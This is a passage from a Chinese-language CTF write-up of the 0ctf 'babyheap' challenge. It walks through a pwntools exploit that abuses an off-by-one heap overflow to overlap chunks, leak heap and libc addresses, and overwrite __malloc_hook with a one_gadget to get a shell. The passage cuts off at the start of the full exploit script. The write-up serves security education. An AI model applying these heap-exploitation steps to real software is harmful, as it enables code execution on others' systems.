class="line">    <span class="comment">/* The remainder from the most recent split of a small request */</span></span><br><span class="line">    mchunkptr last_remainder;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Normal bins packed as described above */</span></span><br><span class="line">    mchunkptr bins[ NBINS * <span class="number">2</span> - <span class="number">2</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Bitmap of bins, help to speed up the process of determinating if a given bin is definitely empty.*/</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> binmap[ BINMAPSIZE ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list, points to the next arena */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Linked list for free arenas.  Access to this field is serialized</span></span><br><span class="line"><span class="comment">       by free_list_lock in arena.c.  */</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">malloc_state</span> *<span class="title">next_free</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Number of threads attached to this arena.  0 if the arena is on</span></span><br><span class="line"><span class="comment">       the free list.  Access to this field is serialized by</span></span><br><span class="line"><span class="comment">       free_list_lock in arena.c.  */</span></span><br><span class="line">    INTERNAL_SIZE_T attached_threads;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Memory allocated from the system in this arena.  */</span></span><br><span class="line">    INTERNAL_SIZE_T system_mem;</span><br><span class="line">    INTERNAL_SIZE_T max_system_mem;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></li></ul><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">sakura@sakuradeMBP:~$ checksec /Users/sakura/Desktop/0ctf/babyheap-1/babyheap</span><br><span class="line">[*] &apos;/Users/sakura/Desktop/0ctf/babyheap-1/babyheap&apos;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure><h3 id="程序分析"><a href="#程序分析" class="headerlink" title="程序分析"></a>程序分析</h3><p>典型的菜单程序<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-181101.png" alt=""><br>比较特别的是存放堆指针的全局变量不再放在bss段，而是随机mmap了一段空间出来存放。<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-181129.png" alt=""><br>添加<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-181505.png" alt=""><br>修改<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-181851.png" alt=""><br>删除<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-181957.png" alt=""><br>查看<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-182021.png" alt=""></p><h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>在修改函数里存在一个off-by-one漏洞，可以用来溢出修改相邻chunk的prev_size或者size.<br>测试：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">alloc</span><span class="params">(size,nowait=False)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'1'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> nowait:</span><br><span class="line"><span class="keyword">return</span></span><br><span class="line">res = p.recvuntil(<span class="string">'Allocated\n'</span>)</span><br><span class="line"><span class="keyword">return</span> int(res.split()[<span class="number">1</span>])</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">update</span><span class="params">(idx,content,size=<span class="number">0</span>)</span>:</span></span><br><span class="line">size = size <span class="keyword">if</span> size <span class="keyword">else</span> len(content)</span><br><span class="line">content = content.ljust(size,<span class="string">"\x00"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'2'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">'Size: '</span>)</span><br><span class="line">p.sendline(str(size))</span><br><span class="line">p.recvuntil(<span class="string">'Content: '</span>)</span><br><span class="line">p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span>  <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'3'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">view</span><span class="params">(idx)</span>:</span></span><br><span class="line">p.recvuntil(<span class="string">'Command: '</span>)</span><br><span class="line">p.sendline(<span class="string">'4'</span>)</span><br><span class="line">p.recvuntil(<span class="string">'Index: '</span>)</span><br><span class="line">p.sendline(str(idx))</span><br><span class="line">p.recvuntil(<span class="string">']: '</span>)</span><br><span class="line"><span class="keyword">return</span> p.recvuntil(<span class="string">'1. Allocate'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./babyheap'</span>)</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">a  = alloc(<span class="number">0x28</span>)</span><br><span class="line">b  = alloc(<span class="number">0x20</span>)</span><br><span class="line">update(a,<span class="string">'A'</span>*<span class="number">0x28</span> + chr(<span class="number">0x41</span>))</span><br><span class="line">gdb.attach(p)</span><br><span class="line">raw_input(<span class="string">'x'</span>)</span><br></pre></td></tr></table></figure></p><p>如图：<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-183058.png" alt=""><br>这里要注意一点就是我把分配的chunk修改一下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">a  = alloc(0x28)</span><br><span class="line">b  = alloc(0x20)</span><br></pre></td></tr></table></figure></p><p><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-183230.png" alt=""><br>可以看出这样就修改到了下一个chunk的prev_size，之所以分配0x28和分配0x20都得到大小为0x30的chunk，是因为chunk的空间复用，如果当前chunk正在使用中，没有被free掉，那么相邻chunk的prev_size域是无效的，可以被前一个chunk使用。</p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><h3 id="leak-heap"><a href="#leak-heap" class="headerlink" title="leak heap"></a>leak heap</h3><p>申请多个chunk，通过off-by-one改变其中一个chunk的size，使其包含两个chunk，即overlap。<br>然后在这个大chunk里伪造fastbin chunk B.<br>然后申请一个和其大小一致的fastbin chunk A，依次释放A和B。<br>则fastbin:B-&gt;A, B的fd就存放着A的堆地址，通过打印大chunk的内容，将其中存放着的小chunk打印出来，从而得到堆地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">meh  = alloc(<span class="number">0x10</span>) <span class="comment">#0</span></span><br><span class="line">ovf  = alloc(<span class="number">0x28</span>) <span class="comment">#1,为了能够溢出修改到相邻chunk的size</span></span><br><span class="line">vic  = alloc(<span class="number">0x20</span>) <span class="comment">#2</span></span><br><span class="line">fake = alloc(<span class="number">0x20</span>) <span class="comment">#3</span></span><br><span class="line">alloc(<span class="number">0x20</span>) <span class="comment">#4</span></span><br><span class="line">update(ovf,<span class="string">'a'</span>*<span class="number">0x28</span> + chr(<span class="number">0x51</span>)) <span class="comment">#2的size被修改为0x51,从而将3包括在内,overlapping！</span></span><br><span class="line">update(fake,p64(<span class="number">-1</span>,sign=<span class="string">'signed'</span>)+p64(<span class="number">-1</span>,sign=<span class="string">'signed'</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line">delete(vic) <span class="comment">#2被free，且将3包含在内</span></span><br><span class="line">bigass = alloc(<span class="number">0x40</span>) <span class="comment">#将2再申请出来,此时的2为</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x /20gx 0x555555757050</span></span><br><span class="line"><span class="string">index 2-&gt;0x555555757050:0x61616161616161610x0000000000000051-&gt;size</span></span><br><span class="line"><span class="string">         0x555555757060:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">         0x555555757070:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">index 3-&gt;0x555555757080:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">         0x555555757090:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))<span class="comment"># 在3伪造chunk，size为0x21</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">index 3-&gt;0x555555757080:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">         0x555555757090:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">delete(meh) <span class="comment">#free 0</span></span><br><span class="line">delete(fake) <span class="comment">## free 3</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fastbin:</span></span><br><span class="line"><span class="string">0x20:fake(3)-&gt;meh(0)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">heap = u64(view(bigass)[<span class="number">0x30</span>:][:<span class="number">8</span>])<span class="comment"># show 2，此时的chunk2,[0x30:][:8]即meh(0)的堆地址</span></span><br><span class="line">log.info(<span class="string">'[*]heap address:'</span>+hex(heap)) <span class="comment">#因为meh是第一个分配的chunk，所以它的地址就是heap基地址。</span></span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">0</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">1</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">2</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">3</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">4</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">1</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">3</span></span><br><span class="line">delete chunk</span><br><span class="line"><span class="number">2</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">2</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">2</span></span><br><span class="line">delete chunk</span><br><span class="line"><span class="number">0</span></span><br><span class="line">delete chunk</span><br><span class="line"><span class="number">3</span></span><br><span class="line">view chunk</span><br><span class="line"><span class="number">2</span></span><br><span class="line">[*] [*]heap address:<span class="number">0x5607a100f000</span></span><br></pre></td></tr></table></figure></p><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>修改3的大小为超出fastbin范围的small bin的大小，将其free，则其fd和bk都指向main_arena，而main_arena在libc上，减去偏移就得到libc基地址。<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line">fake = alloc(<span class="number">0x10</span>)<span class="comment">#再将3申请出来，此时它的内容清空。</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fastbin:</span></span><br><span class="line"><span class="string">0x20:meh(0)</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0xd1</span>))  <span class="comment">#change fake size to 0xd1</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x /20gx 0x555555757050</span></span><br><span class="line"><span class="string">index 2:</span></span><br><span class="line"><span class="string">0x555555757050:0x61616161616161610x0000000000000051</span></span><br><span class="line"><span class="string">0x555555757060:0x61616161616161610x6161616161616161</span></span><br><span class="line"><span class="string">0x555555757070:0x61616161616161610x6161616161616161</span></span><br><span class="line"><span class="string">index 3:</span></span><br><span class="line"><span class="string">0x555555757080:0x00000000000000000x00000000000000d1-&gt;size</span></span><br><span class="line"><span class="string">0x555555757090:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">------------------------------------------------------------------</span></span><br><span class="line"><span class="string">0x5555557570a0:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">0x5555557570b0:0x00000000000000000x0000000000000031</span></span><br><span class="line"><span class="string">0x5555557570c0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570d0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570e0:0x00000000000000000x0000000000020f21</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line">alloc(<span class="number">88</span>,nowait=<span class="keyword">True</span>)</span><br><span class="line">xx = alloc(<span class="number">88</span>)</span><br><span class="line">update(xx,p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>))</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">pwndbg&gt; x /50gx 0x555555757080</span></span><br><span class="line"><span class="string">0x555555757080:0x00000000000000000x00000000000000d1-&gt;size</span></span><br><span class="line"><span class="string">0x555555757090:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570a0:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">0x5555557570b0:0x00000000000000000x0000000000000031</span></span><br><span class="line"><span class="string">0x5555557570c0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570d0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557570e0:0x00000000000000000x0000000000000061</span></span><br><span class="line"><span class="string">0x5555557570f0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757100:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757110:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757120:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757130:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757140:0x00000000000000000x0000000000000061</span></span><br><span class="line"><span class="string">0x555555757150:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">0x555555757160:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757170:0x00000000000000000x0000000000000021</span></span><br><span class="line"><span class="string">0x555555757180:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x555555757190:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">0x5555557571a0:0x00000000000000000x0000000000020e61</span></span><br><span class="line"><span class="string">0x5555557571b0:0x00000000000000000x0000000000000000</span></span><br><span class="line"><span class="string">'''</span>  </span><br><span class="line">delete(fake) <span class="comment"># 此时fake的大小属于small chunk,free后被添加到unsort bins, fd和bk指针指向libc上unsort bins的地址.</span></span><br><span class="line"></span><br><span class="line">main_arena = u64(view(bigass)[<span class="number">0x30</span>:][:<span class="number">8</span>]) - <span class="number">88</span>     <span class="comment">#compute main_arena  header addr</span></span><br><span class="line">log.info(<span class="string">'[*]main_arena address:'</span>+hex(main_arena))</span><br><span class="line">libc = main_arena <span class="number">-0x399b00</span> <span class="comment">#需要用main_arena减去它在libc中的偏移才能得到libc基地址</span></span><br><span class="line"><span class="comment"># 这个偏移可以通过关闭aslr，cat /proc/pid/maps,查看libc的基地址，然后用leak出来main_arena减去这个基地址就得到了偏移。</span></span><br><span class="line">log.info(<span class="string">'[*]libc address:'</span>+hex(libc))</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">0</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">2</span></span><br><span class="line">alloc chunk:</span><br><span class="line"><span class="number">5</span></span><br><span class="line">update chunk:</span><br><span class="line"><span class="number">5</span></span><br><span class="line">delete chunk</span><br><span class="line"><span class="number">0</span></span><br><span class="line">view chunk</span><br><span class="line"><span class="number">2</span></span><br><span class="line">[*] [*]main_arena address:<span class="number">0x7f1c45ddab00</span></span><br><span class="line">[*] [*]libc address:<span class="number">0x7f1c45a41000</span></span><br></pre></td></tr></table></figure></p><h3 id="修改top-chunk-覆盖malloc-hook为one-gadaget"><a href="#修改top-chunk-覆盖malloc-hook为one-gadaget" class="headerlink" title="修改top_chunk,覆盖malloc_hook为one_gadaget"></a>修改top_chunk,覆盖malloc_hook为one_gadaget</h3><p>通过改fastbin的fd，从而使得下一次分配的chunk到我们指定的地址（这里是top_chunk上方）。<br>然后修改top_chunk到malloc_hook上方，使得chunk的分配从malloc_chunk的上方附近开始进行。<br>于是下一次分配就分配到malloc_hook上方，从而可以覆盖malloc_hook为one_gadaget<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">fake_chunk2 = main_arena - <span class="number">0x33</span> <span class="comment">#在malloc_hook上方附近的地址</span></span><br><span class="line">fake_chunk  = main_arena + <span class="number">32</span> + <span class="number">5</span> <span class="comment">#用来绕过对fd的size大小的检查 </span></span><br><span class="line">fake = alloc(<span class="number">0x48</span>) <span class="comment">#将fake从unsorted bin申请出来</span></span><br><span class="line"></span><br><span class="line">xx = alloc(<span class="number">0x58</span>) <span class="comment">#free后，在fastbin占位，用来绕过对fd的size大小的检查 </span></span><br><span class="line"></span><br><span class="line">delete(xx) <span class="comment">#free后，在fastbin占位，用来绕过对fd的size大小的检查 </span></span><br><span class="line">delete(fake)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fastbin:</span></span><br><span class="line"><span class="string">0x50: fake </span></span><br><span class="line"><span class="string">0x60: xx </span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">update(bigass,<span class="string">'a'</span>*<span class="number">0x20</span> + p64(<span class="number">0</span>)+p64(<span class="number">0x51</span>)+p64(fake_chunk)) <span class="comment"># 修改2,将3的fd指向main_arena + 32 + 5</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">fastbin:</span></span><br><span class="line"><span class="string">0x50: fake --&gt; main_arena + 32 + 5</span></span><br><span class="line"><span class="string">0x60: xx </span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="comment"># print hex(fake_chunk),hex(fake_chunk2)</span></span><br><span class="line">alloc(<span class="number">0x48</span>) <span class="comment">#将fastbin中的fake再分配出来</span></span><br><span class="line">arena = alloc(<span class="number">0x48</span>)<span class="comment">#alloc main_arena + 32 + 5</span></span><br><span class="line"><span class="keyword">print</span> arena</span><br></pre></td></tr></table></figure><p>需要注意的是main_arena + 32 + 5是什么？<br>还记得我们之前分配并free的xx = alloc(0x58)么？它在fastbin占位，于是它的地址的第一个字节，如图，0x55，正好可以帮我们绕过对于分配fastbin时，对size的验证。<br><strong>于是我们的chunk就被分配到了这里！</strong><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-201604.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-201728.jpg" alt=""><br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-201552.jpg" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">update(arena,&quot;\x00&quot;*3 + &quot;\x00&quot;*32 + p64(fake_chunk2)) </span><br><span class="line"># 修改top_chunk为fake_chunk2   用\x00填充fastbins，于是下一次分配将会从我们伪造的top_chunk(fake_chunk2)开始.</span><br><span class="line"># 而伪造的top_chunk刚好就在malloc_hook的上方附近。</span><br><span class="line">winit = alloc(0x48)#从伪造的top_chunk开始分配，从而得到malloc_hook上方的空间的chunk</span><br><span class="line">update(winit,&quot;\x00&quot;*3 + &quot;\x00&quot;*16 + p64(libc + 0x3f35a)) #覆盖__malloc_hook到one_gadget</span><br><span class="line">alloc(0x10,nowait=True) # 触发one_gadget来getshell</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">struct malloc_state</span><br><span class="line">&#123;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">  /* Fastbins */</span><br><span class="line">  mfastbinptr fastbinsY[NFASTBINS];</span><br><span class="line"> </span><br><span class="line">  /* Base of the topmost chunk -- not otherwise kept in a bin */</span><br><span class="line">  mchunkptr top;</span><br><span class="line">  ...</span><br><span class="line">  ...</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>注意到我们开始就说过的malloc_state,也就是main_arena它的结构体，可以看到top就在fastbin数组的下面，所以我们malloc出了fastbin数组附近之后，就可以覆盖修改top_chunk了。<br>将top_chunk修改为main_arena-0x33，如图，就在malloc_hook上方。<br>接着就可以分配出这块空间，并且对其修改，覆盖__malloc_hook到one_gadget<br><img src="http://onc55v8te.bkt.clouddn.com/2018-04-02-202858.png" alt=""><br>顺便提一句，寻找one_gadaget可以参考<a href="http://bestwing.me/2016/12/30/one-gadget-rce/" target="_blank" rel="noopener">这篇文章</a></p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span 